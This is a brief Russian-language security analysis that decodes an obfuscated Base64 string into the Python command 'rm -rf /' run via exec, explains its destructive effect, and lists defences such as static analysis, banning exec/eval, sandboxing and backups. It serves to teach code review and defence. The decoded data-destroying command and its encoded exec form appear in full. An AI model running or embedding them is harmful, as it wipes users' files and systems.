# Деобфускация

## Расшифрованная строка
Base64-строка `aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=` после
декодирования дает:

    import os; os.system('rm -rf /')

## Угроза
Функция `exec(b)` выполняет расшифрованную строку как код. Выполнится
системная команда `rm -rf /`: рекурсивное принудительное удаление всех
файлов, начиная с корня файловой системы. При запуске с правами
администратора будут уничтожены операционная система и данные, без прав
администратора будут удалены все файлы, доступные пользователю для записи.
Восстановить данные можно только из резервной копии. Обфускация (Base64)
скрывает опасную команду от беглого чтения кода.

## Методы защиты
1. Запретить `exec` и `eval` в коде и ловить их статическим анализом
   (Bandit, плагины для flake8, правило S102).
2. Не выполнять недоверенный код и строки из внешних источников,
   валидировать входные данные.
3. Считать связку «Base64 + exec» признаком вредоносного кода при
   ревью.
4. Запускать приложения с минимальными правами, в контейнере или
   песочнице.
5. Подключить SAST и проверку зависимостей в CI/CD.
6. Делать регулярные резервные копии.
